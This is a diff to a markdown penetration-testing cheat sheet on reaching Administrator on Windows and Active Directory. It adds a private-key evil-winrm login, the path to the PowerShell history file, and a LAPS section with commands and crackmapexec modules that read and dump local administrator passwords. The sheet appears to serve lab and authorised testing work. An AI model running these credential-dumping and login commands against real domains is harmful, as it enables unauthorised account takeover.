@@ -6,6 +6,9 @@ Everything to check for when trying to become Administrator on Windows
 ### User and group info
 ```powershell
 # User info
+whoami /all
+
+# User info
 net user
 
 # Show groups
@@ -89,8 +92,8 @@ Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalI
 
 # Directories to check
 ```bash
-# Temporary folder
-C:\Windows\System32\spool\drivers\color
+# Powershell history log file
+C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 # See any suspicious apps 
 "C:\Program Files" or "C:\Program Files (x86)"
@@ -120,7 +123,7 @@ Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 Often we have the credentials of limited administrative accounts such as `IT`, `helpdesk` or `support`. Sometimes, These accounts have an ability to reset the passwords.     
 *Note that the wording of the account name might be different, but related to aforementioned privileges*
 
-## RPC password reset
+### RPC password reset
 [https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)
 
 ```bash
@@ -197,9 +200,10 @@ evil-winrm -i <ip> -u <user> -p <password>
 
 # With Pass The Hash (NTLM)
 evil-winrm -i <ip> -u <user> -H <hash>
-```
 
-**(If the password isn't working, try the password with all the users)**
+# With private key and cert
+evil-winrm -i <ip> -S -k <private_key> -c <certificate>
+```
 
 #### References
 - [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
@@ -281,6 +285,44 @@ Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Iden
 - [https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)
 - [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
 - [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0)
+
+
+# LAPS
+LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES       
+
+When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.
+
+## Commands
+```powershell
+# Check if LAPS is activated
+reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+
+dir "C:\Program Files\LAPS\CSE"
+
+# Get commands available
+Get-Command *AdmPwd*
+
+# List who can read LAPS password of the given OU
+Find-AdmPwdExtendedRights -Identity Workstations | fl
+
+# Read the password
+Get-AdmPwdPassword -ComputerName wkstn-2 | fl
+```
+
+## Dumping credentials via crackmapexec
+```bash
+# LDAP
+crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps
+
+# SMB
+crackmapexec smb <ip> -u <user> -p <password> --laps
+```
+
+### References
+- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
+- [https://www.crackmapexec.wiki/smb-protocol/defeating-laps](https://www.crackmapexec.wiki/smb-protocol/defeating-laps)
+- [https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps)
+
 
 # Mount windows shares and VHD files
 The Common Internet File System (CIFS) is a network file-sharing protocol. CIFS is a form of SMB.    
